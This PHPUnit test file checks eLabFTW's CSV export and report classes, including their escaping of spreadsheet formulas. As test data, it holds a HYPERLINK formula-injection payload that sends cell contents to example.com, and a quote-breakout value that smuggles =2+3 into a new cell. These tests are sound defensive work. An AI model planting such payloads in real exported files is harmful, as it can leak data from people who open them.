<?php

declare(strict_types=1);
/**
 * @author Nicolas CARPi <nico-git@deltablot.email>
 * @copyright 2012 Nicolas CARPi
 * @see https://www.elabftw.net Official website
 * @license AGPL-3.0
 * @package elabftw
 */

namespace Elabftw\Make;

use Elabftw\Enums\Action;
use Elabftw\Enums\ReportScopes;
use Elabftw\Exceptions\ForbiddenException;
use Elabftw\Exceptions\ImproperActionException;
use Elabftw\Models\ProcurementRequests;
use Elabftw\Models\StorageUnits;
use Elabftw\Models\Tags;
use Elabftw\Models\Teams;
use Elabftw\Models\Users\Users;
use Elabftw\Traits\TestsUtilsTrait;
use League\Csv\Reader;
use Symfony\Component\HttpFoundation\Response;

use function array_combine;
use function array_shift;
use function count;
use function iterator_to_array;
use function str_ends_with;

class MakeCsvTest extends \PHPUnit\Framework\TestCase
{
    use TestsUtilsTrait;

    private MakeCsv $Make;

    protected function setUp(): void
    {
        $this->Make = new MakeCsv(
            array($this->getFreshExperiment(), $this->getFreshExperiment())
        );
    }

    public function testGetFileName(): void
    {
        $this->assertTrue(str_ends_with($this->Make->getFileName(), 'export.elabftw.csv'));
    }

    public function testGetCsv(): void
    {
        $this->assertIsString($this->Make->getFileContent());
    }

    public function testGetContentType(): void
    {
        $this->assertEquals('text/csv; charset=UTF-8', $this->Make->getContentType());
    }

    public function testMakeProcurementRequestCsv(): void
    {
        // TODO rewrite the class so it can properly be tested
        $ProcurementRequests = new ProcurementRequests(new Teams(new Users(1, 1)), 1);
        // nothing to export!
        $this->expectException(ImproperActionException::class);
        new MakeProcurementRequestsCsv($ProcurementRequests);
    }

    public function testMakeInventoryReport(): void
    {
        $Maker = new MakeInventoryReport(new StorageUnits(new Users(1, 1), false));
        $this->assertIsString($Maker->getFileContent());
    }

    public function testMakeStoredCompoundsReport(): void
    {
        $Maker = new MakeStoredCompoundsReport(new StorageUnits(new Users(1, 1), false));
        $this->assertIsString($Maker->getFileContent());
    }

    public function testMakeTeamReport(): void
    {
        $Maker = new MakeTeamReport(new Users(1, 1));
        $this->assertIsString($Maker->getFileContent());
        // with non admin user
        $this->expectException(ForbiddenException::class);
        new MakeTeamReport(new Users(2, 1));
    }

    public function testMakeInstanceReport(): void
    {
        // with non sysadmin user
        $this->expectException(ForbiddenException::class);
        new MakeReport(new Users(2, 1));
    }

    public function testReportsHandler(): void
    {
        $Handler = new ReportsHandler(new Users(1, 1));
        $this->assertInstanceOf(Response::class, $Handler->getResponse(ReportScopes::Compounds));
        $this->assertInstanceOf(Response::class, $Handler->getResponse(ReportScopes::Instance));
        $this->assertInstanceOf(Response::class, $Handler->getResponse(ReportScopes::Inventory));
        $this->assertInstanceOf(Response::class, $Handler->getResponse(ReportScopes::StoredCompounds));
        $this->assertInstanceOf(Response::class, $Handler->getResponse(ReportScopes::Team));

    }

    public function testFormulasAreEscaped(): void
    {
        $Entity = $this->getFreshExperiment();
        $title = '=HYPERLINK("https://example.com/?leak="&A1,"click")';
        $Entity->patch(Action::Update, array('title' => $title, 'body' => '<p>+1+1</p>'));
        $Tags = new Tags($Entity);
        $Tags->postAction(Action::Create, array('tag' => '@SUM(1,1)'));
        $Entity->readOne();

        $row = $this->parseCsv(new MakeCsv(array($Entity)))[0];
        $this->assertSame("'" . $title, $row['title']);
        $this->assertSame("'+1+1", $row['body']);
        $this->assertSame("'@SUM(1,1)", $row['tags']);
    }

    public function testBackslashCannotEndEnclosure(): void
    {
        // with a backslash as escape character, \" is written without doubling the quote, so a spreadsheet
        // application would end the field there, and the rest of the value would land in a new cell: =2+3
        $Entity = $this->getFreshExperiment();
        $title = 'x\\",=2+3,\\"y';
        $Entity->patch(Action::Update, array('title' => $title));

        $row = $this->parseCsv(new MakeCsv(array($Entity)))[0];
        $this->assertSame($title, $row['title']);
    }

    /**
     * Parse the CSV the way a spreadsheet application does (RFC 4180: no escape character)
     */
    private function parseCsv(AbstractMakeCsv $Make): array
    {
        $Reader = Reader::fromString($Make->getFileContent());
        $Reader->setEscape('');
        $records = iterator_to_array($Reader->getRecords(), false);
        $header = array_shift($records) ?? array();
        $rows = array();
        foreach ($records as $record) {
            // a value spilling into other cells would shift the columns
            $this->assertCount(count($header), $record);
            $rows[] = array_combine($header, $record);
        }
        return $rows;
    }
}
